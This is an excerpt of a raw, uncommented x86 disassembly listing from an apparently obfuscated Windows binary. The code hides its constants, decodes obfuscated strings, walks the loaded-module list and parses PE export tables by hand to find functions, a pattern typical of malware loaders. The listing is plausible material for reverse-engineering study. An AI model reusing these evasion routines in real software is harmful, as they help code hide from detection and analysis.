  4141f9:	mov    ecx,0x7510896
  4141fe:	xor    eax,ecx
  414200:	push   esi
  414201:	mov    esi,DWORD PTR [ebp-0x14]
  414204:	mov    edx,0x3272dd
  414209:	add    eax,edx
  41420b:	push   edi
  41420c:	cmp    esi,eax
  41420e:	je     0x41440c
  414214:	mov    eax,DWORD PTR [ebp-0x10]
  414217:	mov    esi,DWORD PTR [ebp-0x18]
  41421a:	xor    eax,ecx
  41421c:	add    eax,edx
  41421e:	cmp    esi,eax
  414220:	je     0x41440c
  414226:	mov    eax,DWORD PTR [ebp-0x10]
  414229:	xor    eax,ecx
  41422b:	add    eax,edx
  41422d:	mov    DWORD PTR [ebp-0x20],eax
  414230:	mov    eax,DWORD PTR [ebp-0x10]
  414233:	xor    eax,ecx
  414235:	add    eax,edx
  414237:	mov    DWORD PTR [ebp-0x24],eax
  41423a:	movzx  esi,WORD PTR [ebp-0x4]
  41423e:	movzx  edi,WORD PTR [ebp-0xc]
  414242:	mov    eax,0x8a89
  414247:	xor    si,ax
  41424a:	mov    ebx,0x8a89
  41424f:	xor    di,bx
  414252:	mov    eax,0x3b4c
  414257:	add    si,ax
  41425a:	add    di,ax
  41425d:	sub    edi,esi
  41425f:	mov    WORD PTR [ebp-0xc],di
  414263:	mov    esi,DWORD PTR [ebp-0x20]
  414266:	mov    edi,DWORD PTR [ebp-0x14]
  414269:	mov    si,WORD PTR [edi+esi*2]
  41426d:	mov    WORD PTR [ebp+0x8],si
  414271:	mov    esi,DWORD PTR [ebp-0x24]
  414274:	mov    edi,DWORD PTR [ebp-0x18]
  414277:	mov    si,WORD PTR [edi+esi*2]
  41427b:	mov    WORD PTR [ebp+0xc],si
  41427f:	mov    esi,0x72dd
  414284:	jmp    0x414391
  414289:	mov    edi,DWORD PTR [ebp-0x10]
  41428c:	mov    bx,WORD PTR [ebp+0xc]
  414290:	xor    edi,0x896
  414296:	add    edi,esi
  414298:	cmp    bx,di
  41429b:	je     0x4143bb
  4142a1:	mov    edi,DWORD PTR [ebp-0x10]
  4142a4:	mov    ebx,DWORD PTR [ebp+0x10]
  4142a7:	xor    edi,ecx
  4142a9:	add    edi,edx
  4142ab:	cmp    ebx,edi
  4142ad:	mov    di,WORD PTR [ebp+0xc]
  4142b1:	mov    bx,WORD PTR [ebp+0x8]
  4142b5:	je     0x414348
  4142bb:	cmp    bx,di
  4142be:	je     0x414351
  4142c4:	mov    di,WORD PTR [ebp-0x4]
  4142c8:	mov    ebx,0x8a89
  4142cd:	xor    di,bx
  4142d0:	mov    bx,WORD PTR [ebp+0x8]
  4142d4:	add    di,ax
  4142d7:	cmp    bx,di
  4142da:	jb     0x414302
  4142dc:	mov    di,WORD PTR [ebp-0x8]
  4142e0:	mov    ebx,0x8a89
  4142e5:	xor    di,bx
  4142e8:	mov    bx,WORD PTR [ebp+0x8]
  4142ec:	add    di,ax
  4142ef:	cmp    bx,di
  4142f2:	ja     0x414302
  4142f4:	movzx  edi,WORD PTR [ebp+0x8]
  4142f8:	movzx  ebx,WORD PTR [ebp-0xc]
  4142fc:	add    edi,ebx
  4142fe:	mov    WORD PTR [ebp+0x8],di
  414302:	mov    di,WORD PTR [ebp-0x4]
  414306:	mov    ebx,0x8a89
  41430b:	xor    di,bx
  41430e:	mov    bx,WORD PTR [ebp+0xc]
  414312:	add    di,ax
  414315:	cmp    bx,di
  414318:	jb     0x414340
  41431a:	mov    di,WORD PTR [ebp-0x8]
  41431e:	mov    ebx,0x8a89
  414323:	xor    di,bx
  414326:	mov    bx,WORD PTR [ebp+0xc]
  41432a:	add    di,ax
  41432d:	cmp    bx,di
  414330:	ja     0x414340
  414332:	movzx  edi,WORD PTR [ebp+0xc]
  414336:	movzx  ebx,WORD PTR [ebp-0xc]
  41433a:	add    edi,ebx
  41433c:	mov    WORD PTR [ebp+0xc],di
  414340:	mov    di,WORD PTR [ebp+0xc]
  414344:	mov    bx,WORD PTR [ebp+0x8]
  414348:	cmp    bx,di
  41434b:	jne    0x41440c
  414351:	mov    edi,DWORD PTR [ebp-0x28]
  414354:	mov    ebx,DWORD PTR [ebp-0x14]
  414357:	xor    edi,ecx
  414359:	lea    edi,[edi+ebx*1+0x3272dd]
  414360:	mov    DWORD PTR [ebp-0x14],edi
  414363:	mov    edi,DWORD PTR [ebp-0x28]
  414366:	mov    ebx,DWORD PTR [ebp-0x18]
  414369:	xor    edi,ecx
  41436b:	lea    edi,[edi+ebx*1+0x3272dd]
  414372:	mov    DWORD PTR [ebp-0x18],edi
  414375:	mov    edi,DWORD PTR [ebp-0x20]
  414378:	mov    ebx,DWORD PTR [ebp-0x14]
  41437b:	mov    di,WORD PTR [ebx+edi*2]
  41437f:	mov    WORD PTR [ebp+0x8],di
  414383:	mov    edi,DWORD PTR [ebp-0x24]
  414386:	mov    ebx,DWORD PTR [ebp-0x18]
  414389:	mov    di,WORD PTR [ebx+edi*2]
  41438d:	mov    WORD PTR [ebp+0xc],di
  414391:	mov    edi,DWORD PTR [ebp-0x10]
  414394:	mov    bx,WORD PTR [ebp+0x8]
  414398:	xor    edi,0x896
  41439e:	add    edi,esi
  4143a0:	cmp    bx,di
  4143a3:	jne    0x414289
  4143a9:	mov    esi,DWORD PTR [ebp-0x1c]
  4143ac:	xor    esi,ecx
  4143ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4143b1:	add    esi,edx
  4143b3:	imul   esi,ecx
  4143b6:	mov    DWORD PTR [ebp-0x10],esi
  4143b9:	jmp    0x4143cd
  4143bb:	mov    edx,DWORD PTR [ebp-0x10]
  4143be:	xor    edx,ecx
  4143c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4143c3:	lea    ecx,[edx+ecx*1+0x3272dd]
  4143ca:	mov    DWORD PTR [ebp-0x1c],ecx
  4143cd:	mov    edx,DWORD PTR [ebp-0x20]
  4143d0:	mov    esi,DWORD PTR [ebp-0x14]
  4143d3:	mov    si,WORD PTR [esi+edx*2]
  4143d7:	mov    ecx,eax
  4143d9:	sub    si,cx
  4143dc:	mov    edx,0x8a89
  4143e1:	xor    si,dx
  4143e4:	mov    ecx,0x4e3d
  4143e9:	cmp    si,cx
  4143ec:	jne    0x414407
  4143ee:	mov    esi,DWORD PTR [ebp-0x24]
  4143f1:	mov    edi,DWORD PTR [ebp-0x18]
  4143f4:	mov    si,WORD PTR [edi+esi*2]
  4143f8:	sub    si,ax
  4143fb:	xor    si,dx
  4143fe:	cmp    si,cx
  414401:	jne    0x414407
  414403:	xor    eax,eax
  414405:	jmp    0x414413
  414407:	xor    eax,eax
  414409:	inc    eax
  41440a:	jmp    0x414413
  41440c:	mov    eax,DWORD PTR [ebp-0x1c]
  41440f:	xor    eax,ecx
  414411:	add    eax,edx
  414413:	pop    edi
  414414:	pop    esi
  414415:	pop    ebx
  414416:	leave  
  414417:	ret    0xc
  41441a:	push   ebp
  41441b:	mov    ebp,esp
  41441d:	push   ecx
  41441e:	mov    cx,WORD PTR [eax]
  414421:	push   esi
  414422:	mov    esi,0x3b4c
  414427:	sub    cx,si
  41442a:	mov    esi,0x8a89
  41442f:	xor    cx,si
  414432:	mov    esi,0x4e3d
  414437:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41443e:	mov    edx,0xf89c85b5
  414443:	cmp    cx,si
  414446:	je     0x4144a5
  414448:	push   ebx
  414449:	push   edi
  41444a:	movzx  ecx,cx
  41444d:	mov    edi,0xffcd8d23
  414452:	mov    esi,0x7510896
  414457:	mov    ebx,0x4f99
  41445c:	cmp    cx,bx
  41445f:	jne    0x414464
  414461:	mov    DWORD PTR [ebp-0x4],edx
  414464:	lea    edx,[edi+0x1]
  414467:	xor    edx,esi
  414469:	mov    edi,edx
  41446b:	xor    edi,esi
  41446d:	mov    cx,WORD PTR [eax+edi*2+0x64e5ba]
  414475:	mov    ebx,0x3b4c
  41447a:	sub    cx,bx
  41447d:	mov    ebx,0x8a89
  414482:	xor    cx,bx
  414485:	mov    ebx,0x4e3d
  41448a:	cmp    cx,bx
  41448d:	jne    0x414457
  41448f:	mov    ecx,DWORD PTR [ebp-0x4]
  414492:	pop    edi
  414493:	pop    ebx
  414494:	cmp    ecx,0xf89c85b4
  41449a:	je     0x4144a5
  41449c:	xor    ecx,esi
  41449e:	lea    eax,[eax+ecx*2+0x64e5bc]
  4144a5:	pop    esi
  4144a6:	leave  
  4144a7:	ret    
  4144a8:	push   ebp
  4144a9:	mov    ebp,esp
  4144ab:	push   ecx
  4144ac:	push   esi
  4144ad:	push   edi
  4144ae:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  4144b5:	mov    esi,0xf89c85b5
  4144ba:	call   0x41441a
  4144bf:	mov    edi,eax
  4144c1:	mov    al,BYTE PTR [edi]
  4144c3:	add    al,0xb
  4144c5:	xor    al,0x71
  4144c7:	cmp    al,0x7a
  4144c9:	je     0x41452c
  4144cb:	mov    eax,edi
  4144cd:	mov    edx,0xffcd8d23
  4144d2:	mov    ecx,0x7510896
  4144d7:	push   ebx
  4144d8:	mov    ax,WORD PTR [eax]
  4144db:	mov    ebx,0x3b4c
  4144e0:	sub    ax,bx
  4144e3:	mov    ebx,0x8a89
  4144e8:	xor    ax,bx
  4144eb:	mov    ebx,0x4e6b
  4144f0:	cmp    ax,bx
  4144f3:	jne    0x4144f8
  4144f5:	mov    DWORD PTR [ebp-0x4],esi
  4144f8:	lea    esi,[edx+0x1]
  4144fb:	xor    esi,ecx
  4144fd:	mov    edx,esi
  4144ff:	xor    edx,ecx
  414501:	lea    eax,[edi+edx*2+0x64e5ba]
  414508:	mov    bl,BYTE PTR [eax]
  41450a:	add    bl,0xb
  41450d:	xor    bl,0x71
  414510:	cmp    bl,0x7a
  414513:	jne    0x4144d8
  414515:	mov    eax,DWORD PTR [ebp-0x4]
  414518:	pop    ebx
  414519:	cmp    eax,0xf89c85b4
  41451e:	je     0x41452c
  414520:	xor    eax,ecx
  414522:	xor    ecx,ecx
  414524:	mov    WORD PTR [edi+eax*2+0x64e5ba],cx
  41452c:	mov    eax,edi
  41452e:	pop    edi
  41452f:	pop    esi
  414530:	leave  
  414531:	ret    
  414532:	push   ebp
  414533:	mov    ebp,esp
  414535:	push   ecx
  414536:	push   esi
  414537:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41453e:	mov    esi,0xf89c85b5
  414543:	call   0x41441a
  414548:	mov    cx,WORD PTR [eax]
  41454b:	mov    edx,0x3b4c
  414550:	sub    cx,dx
  414553:	mov    edx,0x8a89
  414558:	xor    cx,dx
  41455b:	mov    edx,0x4e3d
  414560:	cmp    cx,dx
  414563:	je     0x4145bc
  414565:	push   ebx
  414566:	push   edi
  414567:	movzx  ecx,cx
  41456a:	mov    edx,0xffcd8d23
  41456f:	mov    edi,0x7510896
  414574:	mov    ebx,0x4e6b
  414579:	cmp    cx,bx
  41457c:	jne    0x414581
  41457e:	mov    DWORD PTR [ebp-0x4],esi
  414581:	lea    esi,[edx+0x1]
  414584:	xor    esi,edi
  414586:	mov    edx,esi
  414588:	xor    edx,edi
  41458a:	mov    cx,WORD PTR [eax+edx*2+0x64e5ba]
  414592:	mov    ebx,0x3b4c
  414597:	sub    cx,bx
  41459a:	mov    ebx,0x8a89
  41459f:	xor    cx,bx
  4145a2:	mov    ebx,0x4e3d
  4145a7:	cmp    cx,bx
  4145aa:	jne    0x414574
  4145ac:	cmp    DWORD PTR [ebp-0x4],0xf89c85b4
  4145b3:	pop    edi
  4145b4:	pop    ebx
  4145b5:	je     0x4145bc
  4145b7:	xor    eax,eax
  4145b9:	inc    eax
  4145ba:	jmp    0x4145be
  4145bc:	xor    eax,eax
  4145be:	pop    esi
  4145bf:	leave  
  4145c0:	ret    
  4145c1:	push   ebp
  4145c2:	mov    ebp,esp
  4145c4:	push   ecx
  4145c5:	mov    eax,DWORD PTR [ebp+0x8]
  4145c8:	movzx  ecx,WORD PTR [eax]
  4145cb:	push   esi
  4145cc:	lea    eax,[ecx-0x3b4c]
  4145d2:	mov    esi,0x8a89
  4145d7:	push   edi
  4145d8:	xor    eax,esi
  4145da:	mov    edi,0x4e3d
  4145df:	mov    DWORD PTR [ebp-0x4],edx
  4145e2:	cmp    ax,di
  4145e5:	je     0x414612
  4145e7:	mov    eax,DWORD PTR [ebp+0x8]
  4145ea:	sub    eax,edx
  4145ec:	mov    DWORD PTR [ebp+0x8],eax
  4145ef:	jmp    0x4145f4
  4145f1:	mov    eax,DWORD PTR [ebp+0x8]
  4145f4:	mov    WORD PTR [edx],cx
  4145f7:	add    edx,0x2
  4145fa:	movzx  edi,WORD PTR [eax+edx*1]
  4145fe:	mov    ecx,edi
  414600:	add    edi,0xffffc4b4
  414606:	xor    edi,esi
  414608:	mov    eax,0x4e3d
  41460d:	cmp    di,ax
  414610:	jne    0x4145f1
  414612:	xor    eax,eax
  414614:	pop    edi
  414615:	mov    WORD PTR [edx],ax
  414618:	mov    eax,DWORD PTR [ebp-0x4]
  41461b:	pop    esi
  41461c:	leave  
  41461d:	ret    0x4
  414620:	push   ebp
  414621:	mov    ebp,esp
  414623:	sub    esp,0x18
  414626:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  41462d:	mov    DWORD PTR [ebp-0x18],0xf89c85b2
  414634:	mov    eax,DWORD PTR [ebp-0x14]
  414637:	xor    eax,0x7510896
  41463c:	add    eax,0x3272dd
  414641:	mov    DWORD PTR [ebp-0x8],eax
  414644:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41464b:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  414652:	mov    DWORD PTR [ebp-0x4],0xf89c85b3
  414659:	mov    eax,DWORD PTR [ebp-0x14]
  41465c:	xor    eax,0x7510896
  414661:	mov    ecx,DWORD PTR [ebp-0x8]
  414664:	lea    eax,[ecx+eax*1+0x3272dd]
  41466b:	mov    ecx,DWORD PTR [ebp-0x18]
  41466e:	xor    ecx,0x7510896
  414674:	add    ecx,0x3272dd
  41467a:	mov    edx,DWORD PTR [ebp+0x10]
  41467d:	imul   edx,ecx
  414680:	cmp    eax,edx
  414682:	jae    0x414775
  414688:	mov    eax,DWORD PTR [ebp+0x10]
  41468b:	mov    ecx,DWORD PTR [ebp-0x8]
  41468e:	sub    eax,ecx
  414690:	mov    ecx,DWORD PTR [ebp-0x10]
  414693:	xor    ecx,0x7510896
  414699:	add    ecx,0x3272dd
  41469f:	cmp    eax,ecx
  4146a1:	jbe    0x4146d3
  4146a3:	mov    eax,DWORD PTR [ebp+0x8]
  4146a6:	add    eax,DWORD PTR [ebp-0x8]
  4146a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4146ac:	add    ecx,DWORD PTR [ebp-0x8]
  4146af:	mov    edx,DWORD PTR [ecx]
  4146b1:	mov    DWORD PTR [eax],edx
  4146b3:	mov    ecx,DWORD PTR [ecx+0x4]
  4146b6:	mov    DWORD PTR [eax+0x4],ecx
  4146b9:	mov    eax,DWORD PTR [ebp-0x10]
  4146bc:	xor    eax,0x7510896
  4146c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4146c4:	lea    eax,[ecx+eax*1+0x3272dd]
  4146cb:	mov    DWORD PTR [ebp-0x8],eax
  4146ce:	jmp    0x414770
  4146d3:	mov    eax,DWORD PTR [ebp+0x10]
  4146d6:	mov    ecx,DWORD PTR [ebp-0x8]
  4146d9:	sub    eax,ecx
  4146db:	mov    ecx,DWORD PTR [ebp-0xc]
  4146de:	xor    ecx,0x7510896
  4146e4:	add    ecx,0x3272dd
  4146ea:	cmp    eax,ecx
  4146ec:	jbe    0x414715
  4146ee:	mov    eax,DWORD PTR [ebp+0x8]
  4146f1:	add    eax,DWORD PTR [ebp-0x8]
  4146f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4146f7:	add    ecx,DWORD PTR [ebp-0x8]
  4146fa:	mov    ecx,DWORD PTR [ecx]
  4146fc:	mov    DWORD PTR [eax],ecx
  4146fe:	mov    eax,DWORD PTR [ebp-0xc]
  414701:	xor    eax,0x7510896
  414706:	mov    ecx,DWORD PTR [ebp-0x8]
  414709:	lea    eax,[ecx+eax*1+0x3272dd]
  414710:	mov    DWORD PTR [ebp-0x8],eax
  414713:	jmp    0x414770
  414715:	mov    eax,DWORD PTR [ebp+0x10]
  414718:	mov    ecx,DWORD PTR [ebp-0x8]
  41471b:	sub    eax,ecx
  41471d:	mov    ecx,DWORD PTR [ebp-0x4]
  414720:	xor    ecx,0x7510896
  414726:	add    ecx,0x3272dd
  41472c:	cmp    eax,ecx
  41472e:	jbe    0x414759
  414730:	mov    eax,DWORD PTR [ebp+0x8]
  414733:	add    eax,DWORD PTR [ebp-0x8]
  414736:	mov    ecx,DWORD PTR [ebp+0xc]
  414739:	add    ecx,DWORD PTR [ebp-0x8]
  41473c:	mov    cx,WORD PTR [ecx]
  41473f:	mov    WORD PTR [eax],cx
  414742:	mov    eax,DWORD PTR [ebp-0x4]
  414745:	xor    eax,0x7510896
  41474a:	mov    ecx,DWORD PTR [ebp-0x8]
  41474d:	lea    eax,[ecx+eax*1+0x3272dd]
  414754:	mov    DWORD PTR [ebp-0x8],eax
  414757:	jmp    0x414770
  414759:	mov    eax,DWORD PTR [ebp+0x8]
  41475c:	add    eax,DWORD PTR [ebp-0x8]
  41475f:	mov    ecx,DWORD PTR [ebp+0xc]
  414762:	add    ecx,DWORD PTR [ebp-0x8]
  414765:	mov    cl,BYTE PTR [ecx]
  414767:	mov    BYTE PTR [eax],cl
  414769:	mov    eax,DWORD PTR [ebp-0x8]
  41476c:	inc    eax
  41476d:	mov    DWORD PTR [ebp-0x8],eax
  414770:	jmp    0x414659
  414775:	leave  
  414776:	ret    0xc
  414779:	push   ebp
  41477a:	mov    ebp,esp
  41477c:	push   ecx
  41477d:	push   ecx
  41477e:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  414785:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  41478c:	xor    eax,eax
  41478e:	inc    eax
  41478f:	je     0x4147d1
  414791:	mov    eax,DWORD PTR [ebp-0x4]
  414794:	xor    eax,0x7510896
  414799:	add    eax,0x3272dd
  41479e:	cmp    DWORD PTR [ebp+0xc],eax
  4147a1:	jne    0x4147a5
  4147a3:	jmp    0x4147d1
  4147a5:	mov    eax,DWORD PTR [ebp-0x8]
  4147a8:	xor    eax,0x7510896
  4147ad:	add    eax,0x3272dd
  4147b2:	mov    ecx,DWORD PTR [ebp+0xc]
  4147b5:	sub    ecx,eax
  4147b7:	mov    DWORD PTR [ebp+0xc],ecx
  4147ba:	mov    eax,DWORD PTR [ebp-0x4]
  4147bd:	xor    eax,0x7510896
  4147c2:	add    eax,0x3272dd
  4147c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4147ca:	add    ecx,DWORD PTR [ebp+0xc]
  4147cd:	mov    BYTE PTR [ecx],al
  4147cf:	jmp    0x41478c
  4147d1:	leave  
  4147d2:	ret    0x8
  4147d5:	push   ebp
  4147d6:	mov    ebp,esp
  4147d8:	sub    esp,0x21c
  4147de:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4147e5:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4147ec:	mov    eax,DWORD PTR [ebp+0x10]
  4147ef:	mov    eax,DWORD PTR [ebp-0x4]
  4147f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4147f5:	push   esi
  4147f6:	push   edi
  4147f7:	mov    edi,0x7510896
  4147fc:	xor    eax,edi
  4147fe:	mov    esi,0x3272dd
  414803:	add    eax,esi
  414805:	cmp    eax,ecx
  414807:	mov    eax,DWORD PTR [ebp-0x4]
  41480a:	jne    0x414815
  41480c:	xor    eax,edi
  41480e:	add    eax,esi
  414810:	jmp    0x4148c1
  414815:	mov    ecx,DWORD PTR [ebp+0xc]
  414818:	xor    eax,edi
  41481a:	add    eax,esi
  41481c:	cmp    eax,ecx
  41481e:	jne    0x414825
  414820:	mov    eax,DWORD PTR [ebp-0x4]
  414823:	jmp    0x41480c
  414825:	lea    eax,[ebp-0x21c]
  41482b:	mov    DWORD PTR [ebp-0x8],eax
  41482e:	mov    eax,DWORD PTR [ebp+0xc]
  414831:	mov    DWORD PTR [ebp-0x10],eax
  414834:	mov    eax,DWORD PTR [ebp-0x4]
  414837:	xor    eax,edi
  414839:	add    eax,esi
  41483b:	mov    DWORD PTR [ebp+0x10],eax
  41483e:	mov    eax,DWORD PTR [ebp+0xc]
  414841:	push   ebx
  414842:	call   0x414532
  414847:	mov    ebx,eax
  414849:	mov    eax,DWORD PTR [ebp+0x8]
  41484c:	mov    eax,DWORD PTR [eax+0x14]
  41484f:	jmp    0x4148a9
  414851:	mov    eax,DWORD PTR [ebp+0xc]
  414854:	sub    eax,0x8
  414857:	mov    DWORD PTR [ebp-0xc],eax
  41485a:	mov    eax,DWORD PTR [ebp-0xc]
  41485d:	mov    eax,DWORD PTR [eax+0x28]
  414860:	call   0x41441a
  414865:	mov    DWORD PTR [ebp+0x10],eax
  414868:	push   DWORD PTR [ebp+0x10]
  41486b:	mov    edx,DWORD PTR [ebp-0x8]
  41486e:	call   0x4145c1
  414873:	mov    eax,DWORD PTR [ebp-0x4]
  414876:	xor    eax,edi
  414878:	add    eax,esi
  41487a:	cmp    eax,ebx
  41487c:	jne    0x414886
  41487e:	mov    eax,DWORD PTR [ebp-0x8]
  414881:	call   0x4144a8
  414886:	mov    eax,DWORD PTR [ebp-0x14]
  414889:	xor    eax,edi
  41488b:	add    eax,esi
  41488d:	push   eax
  41488e:	push   DWORD PTR [ebp-0x10]
  414891:	push   DWORD PTR [ebp-0x8]
  414894:	call   0x4141ac
  414899:	mov    ecx,DWORD PTR [ebp-0x4]
  41489c:	xor    ecx,edi
  41489e:	add    ecx,esi
  4148a0:	cmp    eax,ecx
  4148a2:	je     0x4148c7
  4148a4:	mov    eax,DWORD PTR [ebp+0xc]
  4148a7:	mov    eax,DWORD PTR [eax]
  4148a9:	mov    DWORD PTR [ebp+0xc],eax
  4148ac:	mov    eax,DWORD PTR [ebp+0x8]
  4148af:	mov    ecx,DWORD PTR [ebp+0xc]
  4148b2:	add    eax,0x14
  4148b5:	cmp    ecx,eax
  4148b7:	jne    0x414851
  4148b9:	mov    eax,DWORD PTR [ebp-0x4]
  4148bc:	xor    eax,edi
  4148be:	add    eax,esi
  4148c0:	pop    ebx
  4148c1:	pop    edi
  4148c2:	pop    esi
  4148c3:	leave  
  4148c4:	ret    0xc
  4148c7:	mov    eax,DWORD PTR [ebp-0xc]
  4148ca:	mov    eax,DWORD PTR [eax+0x18]
  4148cd:	jmp    0x4148c0
  4148cf:	push   ebp
  4148d0:	mov    ebp,esp
  4148d2:	mov    eax,DWORD PTR [ebp+0xc]
  4148d5:	sub    esp,0x10
  4148d8:	cmp    DWORD PTR [ebp+0x8],0x0
  4148dc:	push   ebx
  4148dd:	push   esi
  4148de:	push   edi
  4148df:	je     0x414994
  4148e5:	test   eax,eax
  4148e7:	je     0x414994
  4148ed:	movzx  eax,WORD PTR [eax+0x20]
  4148f1:	mov    ecx,eax
  4148f3:	mov    DWORD PTR [ebp-0x10],eax
  4148f6:	xor    edx,edx
  4148f8:	and    DWORD PTR [ebp-0x8],edx
  4148fb:	mov    eax,0x8a89
  414900:	xor    ecx,eax
  414902:	add    ecx,0x3b4c
  414908:	mov    DWORD PTR [ebp-0xc],ecx
  41490b:	and    DWORD PTR [ebp-0x4],0x0
  41490f:	xor    ecx,ecx
  414911:	push   0x7c
  414913:	pop    edi
  414914:	cmp    cx,WORD PTR [ebp-0xc]
  414918:	jae    0x41497e
  41491a:	lea    esi,[edx-0x3b4c]
  414920:	xor    esi,eax
  414922:	movzx  ecx,WORD PTR [ebp-0x4]
  414926:	mov    ebx,DWORD PTR [ebp+0xc]
  414929:	lea    ecx,[ebx+ecx*4]
  41492c:	cmp    WORD PTR [ecx+0x2],si
  414930:	jne    0x414969
  414932:	movzx  ecx,WORD PTR [ecx]
  414935:	mov    edi,0x4e3d
  41493a:	cmp    cx,di
  41493d:	jne    0x41494b
  41493f:	mov    ebx,DWORD PTR [ebp+0x8]
  414942:	movzx  edi,dx
  414945:	cmp    BYTE PTR [edi+ebx*1],0x0
  414949:	je     0x414978
  41494b:	mov    ebx,DWORD PTR [ebp+0x8]
  41494e:	movzx  edi,dx
  414951:	movsx  di,BYTE PTR [edi+ebx*1]
  414956:	mov    ebx,0x3b4c
  41495b:	sub    di,bx
  41495e:	xor    di,ax
  414961:	cmp    cx,di
  414964:	je     0x414978
  414966:	push   0x7a
  414968:	pop    edi
  414969:	inc    DWORD PTR [ebp-0x4]
  41496c:	mov    cx,WORD PTR [ebp-0xc]
  414970:	cmp    WORD PTR [ebp-0x4],cx
  414974:	jb     0x414922
  414976:	jmp    0x41497e
  414978:	inc    DWORD PTR [ebp-0x8]
  41497b:	push   0x7d
  41497d:	pop    edi
  41497e:	mov    esi,DWORD PTR [ebp+0x8]
  414981:	movzx  ecx,dx
  414984:	cmp    BYTE PTR [ecx+esi*1],0x0
  414988:	je     0x41499d
  41498a:	inc    edx
  41498b:	cmp    edi,0x7a
  41498e:	jne    0x41490b
  414994:	xor    eax,eax
  414996:	pop    edi
  414997:	pop    esi
  414998:	pop    ebx
  414999:	leave  
  41499a:	ret    0x8
  41499d:	mov    ecx,DWORD PTR [ebp-0x8]
  4149a0:	add    ecx,0xffffc4b4
  4149a6:	xor    cx,ax
  4149a9:	xor    eax,eax
  4149ab:	cmp    cx,WORD PTR [ebp-0x10]
  4149af:	sete   al
  4149b2:	jmp    0x414996
  4149b4:	push   ebp
  4149b5:	mov    ebp,esp
  4149b7:	sub    esp,0x50
  4149ba:	push   edi
  4149bb:	mov    edi,eax
  4149bd:	mov    eax,DWORD PTR [edi+0x1a8]
  4149c3:	cmp    DWORD PTR [eax],0x0
  4149c6:	jne    0x4149cf
  4149c8:	xor    eax,eax
  4149ca:	jmp    0x414aff
  4149cf:	push   0x2c
  4149d1:	push   DWORD PTR [ebp+0x8]
  4149d4:	call   0x414779
  4149d9:	mov    edx,DWORD PTR [edi+0x1ac]
  4149df:	lea    eax,[edi+0x22]
  4149e2:	mov    DWORD PTR [ebp-0x4c],eax
  4149e5:	lea    eax,[edi+0x44]
  4149e8:	mov    DWORD PTR [ebp-0x48],eax
  4149eb:	lea    eax,[edi+0x66]
  4149ee:	mov    DWORD PTR [ebp-0x44],eax
  4149f1:	lea    eax,[edi+0x88]
  4149f7:	mov    DWORD PTR [ebp-0x40],eax
  4149fa:	lea    eax,[edi+0xaa]
  414a00:	mov    DWORD PTR [ebp-0x3c],eax
  414a03:	lea    eax,[edi+0xcc]
  414a09:	mov    DWORD PTR [ebp-0x38],eax
  414a0c:	lea    eax,[edi+0xee]
  414a12:	mov    DWORD PTR [ebp-0x34],eax
  414a15:	lea    eax,[edi+0x110]
  414a1b:	mov    DWORD PTR [ebp-0x30],eax
  414a1e:	lea    eax,[edi+0x132]
  414a24:	mov    DWORD PTR [ebp-0x2c],eax
  414a27:	lea    eax,[edi+0x154]
  414a2d:	push   edi
  414a2e:	mov    DWORD PTR [ebp-0x50],edi
  414a31:	mov    DWORD PTR [ebp-0x28],eax
  414a34:	call   0x414b33
  414a39:	push   eax
  414a3a:	mov    eax,DWORD PTR [edi+0x1a8]
  414a40:	push   DWORD PTR [eax]
  414a42:	call   0x4147d5
  414a47:	mov    DWORD PTR [ebp-0x10],eax
  414a4a:	test   eax,eax
  414a4c:	je     0x414aff
  414a52:	mov    ecx,DWORD PTR [eax+0x3c]
  414a55:	push   ebx
  414a56:	push   esi
  414a57:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  414a5b:	add    esi,eax
  414a5d:	mov    edi,DWORD PTR [esi+0x24]
  414a60:	mov    ecx,DWORD PTR [esi+0x1c]
  414a63:	mov    edx,DWORD PTR [esi+0x20]
  414a66:	mov    ebx,DWORD PTR [esi+0x18]
  414a69:	add    edi,eax
  414a6b:	mov    DWORD PTR [ebp-0x20],edi
  414a6e:	mov    edi,DWORD PTR [esi+0x14]
  414a71:	add    ecx,eax
  414a73:	add    edx,eax
  414a75:	mov    DWORD PTR [ebp-0xc],ecx
  414a78:	mov    DWORD PTR [ebp-0x1c],edx
  414a7b:	mov    DWORD PTR [ebp-0x8],edi
  414a7e:	cmp    edi,ebx
  414a80:	ja     0x414a85
  414a82:	mov    DWORD PTR [ebp-0x8],ebx
  414a85:	xor    ebx,ebx
  414a87:	mov    DWORD PTR [ebp-0x18],ebx
  414a8a:	cmp    DWORD PTR [ebp-0x8],ebx
  414a8d:	jbe    0x414afd
  414a8f:	jmp    0x414a94
  414a91:	mov    edx,DWORD PTR [ebp-0x1c]
  414a94:	mov    edi,DWORD PTR [ebp-0x20]
  414a97:	movzx  edi,WORD PTR [edi+ebx*2]
  414a9b:	cmp    ebx,DWORD PTR [esi+0x18]
  414a9e:	jae    0x414afd
  414aa0:	cmp    edi,DWORD PTR [esi+0x14]
  414aa3:	jae    0x414afd
  414aa5:	mov    ebx,DWORD PTR [edx+ebx*4]
  414aa8:	mov    edx,DWORD PTR [ebp+0x8]
  414aab:	mov    edi,DWORD PTR [ecx+edi*4]
  414aae:	mov    DWORD PTR [ebp-0x4],edx
  414ab1:	lea    edx,[ebp-0x50]
  414ab4:	add    ebx,eax
  414ab6:	add    edi,eax
  414ab8:	sub    edx,DWORD PTR [ebp+0x8]
  414abb:	mov    DWORD PTR [ebp-0x14],0xb
  414ac2:	mov    DWORD PTR [ebp-0x24],edx
  414ac5:	mov    edx,DWORD PTR [ebp-0x4]
  414ac8:	cmp    DWORD PTR [edx],0x0
  414acb:	jne    0x414ae8
  414acd:	mov    eax,DWORD PTR [ebp-0x24]
  414ad0:	push   DWORD PTR [eax+edx*1]
  414ad3:	push   ebx
  414ad4:	call   0x4148cf
